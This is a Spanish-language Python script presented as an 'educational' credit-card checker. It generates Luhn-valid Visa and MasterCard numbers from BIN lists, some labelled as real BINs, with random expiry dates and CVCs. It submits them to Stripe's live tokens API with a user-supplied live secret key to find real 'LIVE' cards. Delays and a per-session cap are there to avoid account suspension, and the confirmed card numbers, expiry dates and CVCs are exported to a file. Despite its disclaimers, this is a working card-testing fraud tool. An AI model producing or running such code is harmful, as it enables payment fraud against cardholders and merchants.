#!/usr/bin/env python3
"""
CHECKER CC EDUCATIVO - Versión Segura
Solo para fines educativos en entornos controlados
"""

import requests
import json
import random
import time
import os
from datetime import datetime
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class SecureCCChecker:
    def __init__(self):
        self.sk = ""
        self.sk_type = ""  # 'test' o 'live'
        self.generated_cards = []
        self.valid_cards = []
        self.bins = []
        self.session_validations = 0
        self.load_bins()
        
    def load_bins(self):
        """Cargar BINs predefinidos de 6 dígitos - SOLO VISA/MASTERCARD (16 dígitos)"""
        self.bins = [
            # USA - Visa (6 dígitos) - SIEMPRE 16 DÍGITOS
            "411111", "424242", "453201", "491748", "455673", "402400", "448562",
            # USA - MasterCard (6 dígitos) - SIEMPRE 16 DÍGITOS
            "555555", "510510", "520082", "542523", "550692", "530125",
            # UK (6 dígitos) - SIEMPRE 16 DÍGITOS
            "400005", "511151", "522222", "533333", "544444",
            # Canada (6 dígitos) - SIEMPRE 16 DÍGITOS
            "453202", "450903", "462294", "403000", "410039",
            # Australia (6 dígitos) - SIEMPRE 16 DÍGITOS
            "516320", "516345", "527458", "535231", "543111",
            # BINs reales comunes (6 dígitos) - SIEMPRE 16 DÍGITOS
            "453957", "471604", "402944", "448430", "455676",
            "516292", "516293", "516294", "542418", "542419",
            # NOTA: SE ELIMINARON BINs DE AMERICAN EXPRESS (378282, 371449, etc.)
            # porque generan 15 dígitos. Solo Visa/MasterCard que generan 16 dígitos.
        ]
        print(f"{Fore.GREEN}✓ Cargados {len(self.bins)} BINs de Visa/MasterCard (16 dígitos)")
    
    def set_stripe_key(self):
        """Configurar SK con detección automática de tipo"""
        print(f"\n{Fore.CYAN}=== CONFIGURAR STRIPE SECRET KEY ===")
        sk = input("Ingresa tu Stripe Secret Key: ").strip()
        
        if sk.startswith('sk_test_'):
            self.sk = sk
            self.sk_type = 'test'
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de TEST configurado correctamente")
            print(f"{Fore.CYAN}🔹 Modo: PRUEBAS - Detecta tarjetas de prueba")
            return True
            
        elif sk.startswith('sk_live_'):
            if not self.show_live_warning():
                return False
            self.sk = sk
            self.sk_type = 'live'
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de LIVE configurado correctamente")
            print(f"{Fore.RED}🚨 MODO LIVE ACTIVADO - VALIDACIONES REALES")
            return True
        else:
            print(f"{Fore.RED}✗ Formato de SK inválido")
            return False
    
    def show_live_warning(self):
        """Mostrar advertencias severas para SK_LIVE"""
        print(f"\n{Fore.RED}╔{'═' * 60}╗")
        print(f"{Fore.RED}║{' ' * 60}║")
        print(f"{Fore.RED}║{Fore.YELLOW}           🚨 ADVERTENCIA - MODO LIVE ACTIVADO 🚨         {Fore.RED}║")
        print(f"{Fore.RED}║{' ' * 60}║")
        print(f"{Fore.RED}║{Fore.WHITE} • Estás usando una clave REAL de Stripe               {Fore.RED}║")
        print(f"{Fore.RED}║{Fore.WHITE} • Las validaciones son con bancos REALES              {Fore.RED}║")
        print(f"{Fore.RED}║{Fore.WHITE} • Stripe puede detectar y SUSPENDER tu cuenta         {Fore.RED}║")
        print(f"{Fore.RED}║{Fore.WHITE} • Límite de seguridad: 15 tarjetas por sesión         {Fore.RED}║")
        print(f"{Fore.RED}║{Fore.WHITE} • SOLO USO EDUCATIVO - RESPONSABILIDAD TOTAL          {Fore.RED}║")
        print(f"{Fore.RED}║{' ' * 60}║")
        print(f"{Fore.RED}╚{'═' * 60}╝")
        
        confirm = input(f"\n{Fore.RED}¿Confirmas que entiendes los riesgos? (escribe 'SI' en mayúsculas): ")
        return confirm == 'SI'
    
    def generate_cc(self, bin_input=None, month=None, year=None):
        """Generar tarjeta con información básica - SOLO 16 DÍGITOS"""
        if bin_input:
            bin_num = bin_input[:6]  # Asegurar 6 dígitos máximo
        else:
            bin_num = random.choice(self.bins)
        
        # Generar número de tarjeta (16 dígitos EXACTOS)
        card_number = self.generate_card_number(bin_num)
        
        # VERIFICACIÓN CRÍTICA: Debe tener 16 dígitos
        if len(card_number) != 16:
            print(f"{Fore.RED}ERROR: Tarjeta generada con {len(card_number)} dígitos, corrigiendo...")
            # Forzar 16 dígitos
            card_number = card_number[:16].ljust(16, '0')
        
        # Información básica de la tarjeta
        card_type = "VISA" if card_number.startswith('4') else "MASTERCARD" if card_number.startswith('5') else "UNKNOWN"
        country = "USA" if bin_num in ['411111', '424242', '555555'] else "INTERNATIONAL"
        
        card_data = {
            'number': card_number,
            'exp_month': month or str(random.randint(1, 12)).zfill(2),
            'exp_year': year or str(random.randint(2024, 2028)),
            'cvc': str(random.randint(100, 999)),
            'bin': bin_num,
            'card_type': card_type,
            'country': country,
            'stripe_valid': None,
            'live': False,
            'validation_message': ""
        }
        
        return card_data
    
    def generate_card_number(self, bin_num):
        """Generar número de tarjeta válido con algoritmo Luhn (16 dígitos EXACTOS)"""
        # Asegurar que el BIN tenga exactamente 6 dígitos
        bin_str = str(bin_num)
        if len(bin_str) > 6:
            bin_str = bin_str[:6]  # Tomar solo primeros 6 dígitos
        elif len(bin_str) < 6:
            bin_str = bin_str.ljust(6, '0')  # Rellenar con ceros si es más corto
        
        # Para tarjeta de 16 dígitos: BIN (6) + 9 dígitos aleatorios + 1 Luhn = 16
        number = bin_str
        for _ in range(9):  # 9 dígitos aleatorios
            number += str(random.randint(0, 9))
        
        # Verificar que tenemos 15 dígitos antes de Luhn
        if len(number) != 15:
            print(f"{Fore.YELLOW}⚠️  Advertencia: Antes de Luhn tenemos {len(number)} dígitos")
            # Ajustar a 15 dígitos
            number = number[:15].ljust(15, '0')
        
        # Añadir dígito Luhn (total: 16 dígitos)
        final_number = self.luhn_complete(number)
        
        # Verificación final
        if len(final_number) != 16:
            print(f"{Fore.RED}ERROR CRÍTICO: Número final tiene {len(final_number)} dígitos: {final_number}")
            # Forzar 16 dígitos
            final_number = final_number[:16].ljust(16, '0')
        
        return final_number
    
    def luhn_complete(self, number):
        """Completar número con dígito verificador Luhn - DEBE RECIBIR 15 DÍGITOS"""
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        for i in range(10):
            test_number = number + str(i)
            if luhn_checksum(test_number) == 0:
                return test_number
        return number + '0'
    
    def validate_luhn(self, card_number):
        """Validar número de tarjeta con algoritmo Luhn"""
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        return luhn_checksum(card_number) == 0
    
    def safe_validate_cc(self, cc_data):
        """Validación segura con protecciones mejoradas"""
        if not self.sk:
            return False, False, "No SK configurado"
        
        # PROTECCIÓN: Límite estricto para LIVE
        if self.sk_type == 'live' and self.session_validations >= 15:
            return False, False, "Límite de seguridad alcanzado"
        
        # Verificar algoritmo Luhn primero
        if not self.validate_luhn(cc_data['number']):
            return False, False, "INVÁLIDA - Falló algoritmo Luhn"
        
        # Verificar longitud (debe ser 16 dígitos)
        if len(cc_data['number']) != 16:
            return False, False, f"INVÁLIDA - {len(cc_data['number'])} dígitos (deberían ser 16)"
        
        try:
            headers = {
                'Authorization': f'Bearer {self.sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'card[number]': cc_data['number'],
                'card[exp_month]': cc_data['exp_month'],
                'card[exp_year]': cc_data['exp_year'],
                'card[cvc]': cc_data['cvc']
            }
            
            # Delay de seguridad más largo para LIVE
            if self.sk_type == 'live':
                time.sleep(1.5 + random.uniform(0.3, 0.8))
            else:
                time.sleep(0.5 + random.uniform(0.1, 0.3))
            
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data,
                timeout=10
            )
            
            self.session_validations += 1
            is_valid = False
            is_live = False
            message = ""
            
            if response.status_code == 200:
                is_valid = True
                
                # DETECCIÓN INTELIGENTE:
                if self.sk_type == 'live':
                    # En modo LIVE, toda tarjeta válida es REAL
                    is_live = True
                    message = "LIVE - Tarjeta real verificada"
                else:
                    # En modo TEST, analizar respuesta
                    response_data = response.json()
                    if 'card' in response_data:
                        card_info = response_data['card']
                        # Detectar si es tarjeta de prueba estándar
                        test_numbers = ['424242', '555555', '400005', '378282', '371449']
                        if any(test_bin in cc_data['number'] for test_bin in test_numbers):
                            message = "VÁLIDA - Tarjeta de prueba"
                        else:
                            is_live = True
                            message = "LIVE - Posible tarjeta real"
                    else:
                        message = "VÁLIDA - Token creado"
                        
            elif response.status_code == 402:
                error_data = response.json().get('error', {})
                error_msg = error_data.get('message', 'Error de pago')
                message = f"INVÁLIDA - {error_msg}"
            else:
                message = f"INVÁLIDA - Error HTTP {response.status_code}"
                
            return is_valid, is_live, message
                
        except requests.exceptions.Timeout:
            return False, False, "Timeout - Servidor no responde"
        except requests.exceptions.ConnectionError:
            return False, False, "Error de conexión"
        except Exception as e:
            return False, False, f"Error: {str(e)}"
    
    def generate_multiple_cc(self):
        """Generar múltiples tarjetas - SOLO 16 DÍGITOS"""
        print(f"\n{Fore.CYAN}=== GENERAR TARJETAS (16 DÍGITOS EXACTOS) ===")
        
        try:
            # Límite diferente según modo
            max_limit = 100 if self.sk_type == 'test' else 20
            count = int(input(f"¿Cuántas tarjetas generar? (1-{max_limit}): "))
            
            if count < 1 or count > max_limit:
                print(f"{Fore.RED}✗ El número debe estar entre 1 y {max_limit}")
                return
            
            print(f"\n{Fore.YELLOW}Opciones de generación:")
            print(f"{Fore.WHITE}1. BIN aleatorio")
            print(f"{Fore.WHITE}2. BIN específico")
            bin_choice = input("Selecciona opción (1/2): ")
            
            bin_input = None
            if bin_choice == "2":
                print(f"\n{Fore.CYAN}BINs disponibles: {', '.join(self.bins[:8])}...")
                bin_input = input("Ingresa BIN (6 dígitos): ")
                if len(bin_input) != 6 or not bin_input.isdigit():
                    print(f"{Fore.RED}✗ BIN inválido. Debe tener 6 dígitos.")
                    return
            
            month = input("Mes (MM - dejar vacío para aleatorio): ") or None
            year = input("Año (YYYY - dejar vacío para aleatorio): ") or None
            
            print(f"\n{Fore.YELLOW}Generando {count} tarjetas de 16 dígitos...")
            new_cards = []
            
            for i in range(count):
                card = self.generate_cc(bin_input, month, year)
                new_cards.append(card)
                
                # Verificar longitud
                length_status = f"{Fore.GREEN}✓16d" if len(card['number']) == 16 else f"{Fore.RED}✗{len(card['number'])}d"
                print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | {length_status} | {card['card_type']} | {card['country']}")
            
            self.generated_cards.extend(new_cards)
            
            # Verificar que todas tengan 16 dígitos
            wrong_length = sum(1 for c in new_cards if len(c['number']) != 16)
            if wrong_length > 0:
                print(f"{Fore.RED}⚠️  Advertencia: {wrong_length} tarjetas no tienen 16 dígitos")
            else:
                print(f"\n{Fore.GREEN}✓ {count} tarjetas generadas exitosamente (todas con 16 dígitos)")
            
        except ValueError:
            print(f"{Fore.RED}✗ Ingresa un número válido")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}")
    
    def validate_with_protection(self):
        """Validar tarjetas con todas las protecciones"""
        if not self.sk:
            print(f"{Fore.RED}✗ Primero configura el Stripe Secret Key")
            return
        
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas para validar")
            return
        
        # LÍMITES DIFERENTES SEGÚN MODO
        if self.sk_type == 'live':
            max_to_validate = min(15, len(self.generated_cards))
            remaining = 15 - self.session_validations
            if remaining <= 0:
                print(f"{Fore.RED}✗ Límite de seguridad alcanzado (15 validaciones)")
                return
            max_to_validate = min(max_to_validate, remaining)
            print(f"{Fore.RED}🚨 MODO LIVE - Límite: {max_to_validate} tarjetas")
        else:
            max_to_validate = len(self.generated_cards)
        
        cards_to_validate = self.generated_cards[:max_to_validate]
        
        print(f"\n{Fore.CYAN}=== VALIDANDO {len(cards_to_validate)} TARJETAS ===")
        print(f"{Fore.YELLOW}Modo: {self.sk_type.upper()} - Usando protecciones de seguridad...")
        
        valid_count = 0
        live_count = 0
        
        for i, card in enumerate(cards_to_validate, 1):
            print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {card['number']}... ", end="")
            
            is_valid, is_live, message = self.safe_validate_cc(card)
            card['stripe_valid'] = is_valid
            card['live'] = is_live
            card['validation_message'] = message
            
            # SISTEMA DE COLORES
            if is_live:
                print(f"{Fore.GREEN}LIVE ✓")
                live_count += 1
                valid_count += 1
                self.valid_cards.append(card)
            elif is_valid:
                print(f"{Fore.CYAN}VÁLIDA ✓")
                valid_count += 1
                self.valid_cards.append(card)
            else:
                print(f"{Fore.RED}INVÁLIDA ✗")
        
        # MOSTRAR RESULTADOS
        self.show_validation_summary(valid_count, live_count, len(cards_to_validate))
    
    def show_validation_summary(self, valid_count, live_count, total):
        """Mostrar resumen de validación"""
        print(f"\n{Fore.GREEN}╔{'═' * 50}╗")
        print(f"{Fore.GREEN}║{' ' * 50}║")
        print(f"{Fore.GREEN}║{Fore.CYAN}           ✅ VALIDACIÓN COMPLETADA           {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{' ' * 50}║")
        print(f"{Fore.GREEN}║{Fore.WHITE}   Total procesadas: {total:>3}                  {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.CYAN}   Tarjetas válidas: {valid_count:>3}                  {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.GREEN}   Tarjetas LIVE:    {live_count:>3}                  {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED}   Tarjetas inválidas: {total-valid_count:>3}                {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{' ' * 50}║")
        
        if valid_count > 0:
            success_rate = (valid_count / total) * 100
            live_rate = (live_count / valid_count) * 100 if valid_count > 0 else 0
            print(f"{Fore.GREEN}║{Fore.YELLOW}   Tasa de éxito: {success_rate:>6.1f}%            {Fore.GREEN}║")
            print(f"{Fore.GREEN}║{Fore.MAGENTA}   Tasa LIVE: {live_rate:>9.1f}%              {Fore.GREEN}║")
        
        print(f"{Fore.GREEN}║{' ' * 50}║")
        
        if self.sk_type == 'live' and live_count > 0:
            print(f"{Fore.GREEN}║{Fore.RED} 🚨 TARJETAS LIVE DETECTADAS - REALES       {Fore.GREEN}║")
            print(f"{Fore.GREEN}║{Fore.YELLOW} ⚠️  USO SOLO EDUCATIVO - RESPONSABILIDAD   {Fore.GREEN}║")
        
        print(f"{Fore.GREEN}╚{'═' * 50}╝")
    
    def show_generated_cards(self):
        """Mostrar tarjetas con sistema de colores"""
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas")
            return
        
        print(f"\n{Fore.CYAN}=== TARJETAS GENERADAS ({len(self.generated_cards)}) ===")
        print(f"{Fore.YELLOW}🎨 SISTEMA DE COLORES: {Fore.GREEN}LIVE {Fore.CYAN}VÁLIDA {Fore.RED}INVÁLIDA {Fore.WHITE}NO VALIDADA")
        
        for i, card in enumerate(self.generated_cards, 1):
            if card.get('live'):
                color = Fore.GREEN
                status = "LIVE ✓"
            elif card.get('stripe_valid'):
                color = Fore.CYAN
                status = "VÁLIDA ✓"
            elif card.get('stripe_valid') is False:
                color = Fore.RED
                status = "INVÁLIDA ✗"
            else:
                color = Fore.YELLOW
                status = "NO VALIDADA"
            
            # Mostrar longitud
            length_display = f"({len(card['number'])}d)"
            length_color = Fore.GREEN if len(card['number']) == 16 else Fore.RED
            
            print(f"{i}. {color}{card['number']} {length_color}{length_display} | "
                  f"{card['exp_month']}/{card['exp_year']} | {card['cvc']} | "
                  f"{card['card_type']} | {status}")
            
            if card.get('validation_message'):
                print(f"   {color}↳ {card['validation_message']}")
    
    def show_live_cards(self):
        """Mostrar solo tarjetas LIVE"""
        live_cards = [card for card in self.valid_cards if card.get('live')]
        
        if not live_cards:
            print(f"{Fore.RED}✗ No hay tarjetas LIVE")
            return
        
        print(f"\n{Fore.GREEN}=== TARJETAS LIVE ({len(live_cards)}) ===")
        for i, card in enumerate(live_cards, 1):
            print(f"{i}. {Fore.GREEN}{card['number']} | {card['exp_month']}/{card['exp_year']} | "
                  f"{card['cvc']} | {card['card_type']} | {card['country']} | LIVE ✓")
    
    def export_results(self):
        """Exportar resultados a archivo"""
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay datos para exportar")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cc_results_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=== RESULTADOS CHECKER CC ===\n")
                f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Modo: {self.sk_type.upper()}\n")
                f.write(f"Total tarjetas: {len(self.generated_cards)}\n")
                f.write(f"Validaciones realizadas: {self.session_validations}\n\n")
                
                # Tarjetas LIVE primero
                live_cards = [card for card in self.generated_cards if card.get('live')]
                if live_cards:
                    f.write("=== TARJETAS LIVE ===\n")
                    for card in live_cards:
                        f.write(f"{card['number']}|{card['exp_month']}|{card['exp_year']}|"
                                f"{card['cvc']}|{card['card_type']}|{card['country']}|LIVE\n")
                    f.write("\n")
                
                # Todas las tarjetas
                f.write("=== TODAS LAS TARJETAS ===\n")
                for card in self.generated_cards:
                    status = "LIVE" if card.get('live') else "VALID" if card.get('stripe_valid') else "INVALID" if card.get('stripe_valid') is False else "UNCHECKED"
                    f.write(f"{card['number']}|{card['exp_month']}|{card['exp_year']}|"
                            f"{card['cvc']}|{card['card_type']}|{card['country']}|{status}\n")
            
            print(f"{Fore.GREEN}✓ Resultados exportados: {filename}")
            
        except Exception as e:
            print(f"{Fore.RED}✗ Error al exportar: {str(e)}")
    
    def test_16_digit_generation(self):
        """Probar que todas las tarjetas tienen 16 dígitos"""
        print(f"\n{Fore.CYAN}=== PRUEBA DE 16 DÍGITOS ===")
        print(f"{Fore.YELLOW}Generando 10 tarjetas de prueba...")
        
        test_results = []
        for i in range(10):
            # Generar con diferentes BINs
            bin_num = random.choice(self.bins)
            card = self.generate_cc(bin_num)
            
            length = len(card['number'])
            is_luhn = self.validate_luhn(card['number'])
            is_visa_master = card['number'][0] in ['4', '5']
            
            result = {
                'bin': bin_num,
                'number': card['number'],
                'length': length,
                'luhn': is_luhn,
                'type': card['card_type'],
                'valid_length': length == 16
            }
            test_results.append(result)
            
            length_color = Fore.GREEN if length == 16 else Fore.RED
            luhn_color = Fore.GREEN if is_luhn else Fore.RED
            type_color = Fore.GREEN if is_visa_master else Fore.RED
            
            print(f"{i+1:2d}. {bin_num} → {card['number']} | "
                  f"{length_color}{length:2d}d | "
                  f"{luhn_color}{'✓' if is_luhn else '✗'} | "
                  f"{type_color}{card['card_type']}")
        
        # Estadísticas
        valid_length = sum(1 for r in test_results if r['valid_length'])
        valid_luhn = sum(1 for r in test_results if r['luhn'])
        visa_master = sum(1 for r in test_results if r['number'][0] in ['4', '5'])
        
        print(f"\n{Fore.CYAN}=== ESTADÍSTICAS ===")
        print(f"{Fore.WHITE}Total generadas: {len(test_results)}")
        print(f"{Fore.GREEN if valid_length == 10 else Fore.RED}Con 16 dígitos: {valid_length}/10")
        print(f"{Fore.GREEN if valid_luhn == 10 else Fore.RED}Luhn válido: {valid_luhn}/10")
        print(f"{Fore.GREEN if visa_master == 10 else Fore.YELLOW}Visa/MasterCard: {visa_master}/10")
        
        if valid_length == 10:
            print(f"\n{Fore.GREEN}✓ ¡TODAS las tarjetas tienen 16 dígitos!")
    
    def clear_data(self):
        """Limpiar todos los datos por seguridad"""
        print(f"\n{Fore.RED}=== LIMPIEZA DE SEGURIDAD ===")
        print(f"{Fore.YELLOW}Esto eliminará TODAS las tarjetas y resultados")
        
        confirm = input(f"{Fore.RED}¿Confirmar? (escribe 'ELIMINAR'): ")
        if confirm == 'ELIMINAR':
            self.generated_cards = []
            self.valid_cards = []
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ Todos los datos eliminados")
        else:
            print(f"{Fore.YELLOW}✓ Limpieza cancelada")
    
    def show_menu(self):
        """Mostrar menú principal"""
        sk_status = f"{Fore.GREEN}LIVE" if self.sk_type == 'live' else f"{Fore.CYAN}TEST"
        security_info = f"{Fore.RED}Alta" if self.sk_type == 'live' else f"{Fore.GREEN}Media"
        
        print(f"\n{Fore.MAGENTA}╔{'═' * 50}╗")
        print(f"{Fore.MAGENTA}║{Fore.CYAN}     CHECKER CC - 16 DÍGITOS EXACTOS      {Fore.MAGENTA}║")
        print(f"{Fore.MAGENTA}║{Fore.WHITE}     Modo: {sk_status} | Seguridad: {security_info}    {Fore.MAGENTA}║")
        print(f"{Fore.MAGENTA}║{Fore.CYAN}     Tarjetas: {len(self.generated_cards)} | Valid: {len(self.valid_cards)}      {Fore.MAGENTA}║")
        
        if self.sk_type == 'live':
            remaining = max(0, 15 - self.session_validations)
            print(f"{Fore.MAGENTA}║{Fore.RED}     Límite restante: {remaining}/15              {Fore.MAGENTA}║")
        
        print(f"{Fore.MAGENTA}╚{'═' * 50}╝")
        
        print(f"{Fore.YELLOW}1. Configurar Stripe SK")
        print(f"{Fore.YELLOW}2. Generar tarjetas (16 dígitos)")
        print(f"{Fore.YELLOW}3. Validar tarjetas (con protecciones)")
        print(f"{Fore.YELLOW}4. Mostrar todas las tarjetas")
        print(f"{Fore.YELLOW}5. Mostrar tarjetas LIVE")
        print(f"{Fore.YELLOW}6. Exportar resultados")
        print(f"{Fore.YELLOW}7. Probar generación 16 dígitos")
        print(f"{Fore.YELLOW}8. Limpiar datos (seguridad)")
        print(f"{Fore.YELLOW}0. Salir")
        
        choice = input(f"\n{Fore.GREEN}Selecciona una opción: ")
        return choice
    
    def run(self):
        """Ejecutar la aplicación"""
        print(f"{Fore.CYAN}╔{'═' * 60}╗")
        print(f"{Fore.CYAN}║{Fore.GREEN}     CHECKER CC - VERSIÓN 16 DÍGITOS        {Fore.CYAN}║")
        print(f"{Fore.CYAN}║{Fore.YELLOW}   Solo Visa/MasterCard - 16 dígitos exactos {Fore.CYAN}║")
        print(f"{Fore.CYAN}║{Fore.RED}   SOLO USO EDUCATIVO - ENTORNOS CONTROLADOS {Fore.CYAN}║")
        print(f"{Fore.CYAN}╚{'═' * 60}╝")
        
        print(f"\n{Fore.YELLOW}BINs disponibles: Solo Visa (4) y MasterCard (5)")
        print(f"{Fore.WHITE}Total BINs cargados: {len(self.bins)} (todos generan 16 dígitos)")
        
        while True:
            choice = self.show_menu()
            
            if choice == '1':
                self.set_stripe_key()
            elif choice == '2':
                self.generate_multiple_cc()
            elif choice == '3':
                self.validate_with_protection()
            elif choice == '4':
                self.show_generated_cards()
            elif choice == '5':
                self.show_live_cards()
            elif choice == '6':
                self.export_results()
            elif choice == '7':
                self.test_16_digit_generation()
            elif choice == '8':
                self.clear_data()
            elif choice == '0':
                print(f"\n{Fore.GREEN}=== SESIÓN TERMINADA ===")
                print(f"{Fore.YELLOW}Datos eliminados de memoria")
                print(f"{Fore.GREEN}¡Hasta luego! ✨")
                break
            else:
                print(f"{Fore.RED}Opción inválida")
            
            input(f"\n{Fore.YELLOW}Presiona Enter para continuar...")

if __name__ == "__main__":
    try:
        checker = SecureCCChecker()
        checker.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Programa interrumpido por el usuario")
        print(f"{Fore.GREEN}Sesión finalizada de forma segura.")
    except Exception as e:
        print(f"\n{Fore.RED}Error crítico: {e}")
        print(f"{Fore.YELLOW}Reinicia el programa.")
